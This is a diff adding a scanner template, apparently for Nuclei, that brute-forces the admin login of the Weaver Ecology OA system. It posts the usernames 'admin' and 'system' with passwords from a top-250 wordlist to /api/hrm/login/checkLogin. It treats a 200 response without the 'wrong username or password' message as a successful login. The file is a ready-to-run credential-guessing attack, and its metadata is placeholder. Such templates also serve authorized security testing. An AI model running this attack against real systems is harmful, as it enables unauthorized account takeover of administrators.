@@ -1,0 +1,44 @@
+id: fuzz-login-ecology-adminuser
+
+info:
+  name: fuzz-login-ecology-adminuser
+  author: capiton
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: loginfuzz
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/hrm/login/checkLogin"
+    headers:
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+        Accept-Encoding: gzip, deflate
+    body: "islanguid=7&loginid={{username}}&userpassword={{password}}&dynamicPassword=&tokenAuthKey=&validatecode=&validateCodeKey=&logintype=1&messages=&isie=false&"
+
+    payloads:
+      username:
+       - admin
+       - system
+
+      password: "helpers/wordlists/password-TOP250"
+    
+    attack: clusterbomb
+    stop-at-first-match: true
+    
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        name: ecologylogin
+        part: body
+        words:
+          - '{"msgcode":"16","msg":"用户名或密码错误"'
+        negative: true
+        
+      - type: status
+        status:
+          - 200
